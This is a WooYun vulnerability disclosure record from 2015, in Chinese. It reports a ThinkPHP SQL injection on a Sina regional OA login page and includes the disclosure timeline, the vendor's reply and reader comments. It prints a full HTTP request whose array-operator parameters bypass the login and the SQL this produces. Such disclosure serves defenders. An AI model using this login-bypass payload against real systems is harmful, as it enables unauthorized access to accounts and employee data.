{"id": 32880, "wybug_id": "wooyun-2015-0109574", "wybug_title": "新浪某分站ThinkPHP框架存在SQL注入问题", "wybug_corp": "新浪", "wybug_author": "猪猪侠", "wybug_date": "2015-04-22 00:27", "wybug_open_date": "2015-06-06 15:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向公众公开  简要描述： 新浪某分站ThinkPHP框架存在SQL注入问题http://www.wooyun.org/bugs/wooyun-2014-086742 详细说明：  开启了ThinkPHP调试功能，每条SQL都能查看到http://oa.gd.sina.com.cn/login/check_login测试可构造万能密码 WooYun: ThinkPHP架构设计不合理极易导致SQL注入 \n\n   漏洞证明：  \nPOST /login/check_login HTTP/1.1Host: oa.gd.sina.com.cnProxy-Connection: keep-aliveContent-Length: 40Pragma: no-cacheCache-Control: no-cacheAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://oa.gd.sina.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://oa.gd.sina.com.cn/login/indexAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4emp_no[0]=neq&emp_no[1]=admin&password=1\n变成执行了如下SQL：\nSELECT User.emp_name AS name,User.id AS id,User.emp_no AS emp_no,User.emp_name AS emp_name,User.letter AS letter,User.password AS password,User.dept_id AS dept_id,User.position_id AS position_id,User.rank_id AS rank_id,User.sex AS sex,User.birthday AS birthday,User.last_login_ip AS last_login_ip,User.login_count AS login_count,User.pic AS pic,User.email AS email,User.duty AS duty,User.office_tel AS office_tel,User.mobile_tel AS mobile_tel,User.create_time AS create_time,User.update_time AS update_time,User.is_del AS is_del,User.openid AS openid,User.westatus AS westatus,User.rank_gwzn AS rank_gwzn,User.rank_name AS rank_name,User.leader AS leader,User.marriage AS marriage,User.native_place AS native_place,User.id_number AS id_number,User.nation AS nation,User.education AS education,User.graduate_school AS graduate_school,User.blood AS blood,User.constellation AS constellation,User.qq AS qq,User.weixin AS weixin,User.weibo AS weibo,User.domicile AS domicile,User.set_order AS set_order,User.is_admin AS is_admin,User.is_city AS is_city,User.grade_id AS grade_id,Dept.name AS dept_name FROM oa_user User JOIN oa_dept Dept ON Dept.id=User.dept_id WHERE ( User.emp_name <> 'admin' ) OR ( User.emp_no <> 'admin' ) LIMIT 1\n   修复方案：  更新thinkphp   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-04-22 15:01 厂商回复： 感谢关注新浪安全，漏洞修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-22 00:38 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  第一次抢沙发好开心    \n     2015-04-22 01:18 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  大半夜了谁给审的洞，在喝啤酒么？？    \n     2015-04-22 08:02 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  也许是给扫描器加了这个功能~    \n     2015-04-22 08:08 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  难道是猪猪侠在检测又一神器专搞thinkphp框架？    \n     2015-04-22 08:19 |    \t\tkydhzy \t\t\t( 普通白帽子  |\t\t\t        Rank:362 漏洞数:62        | 软件测试)\t\t \n  猪猪侠， 出来了， 大家都闪一边去.    \n     2015-04-22 09:42 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  没看到猪猪侠发过0day    \n     2015-04-22 21:26 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  交出神器，给你棒棒糖    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}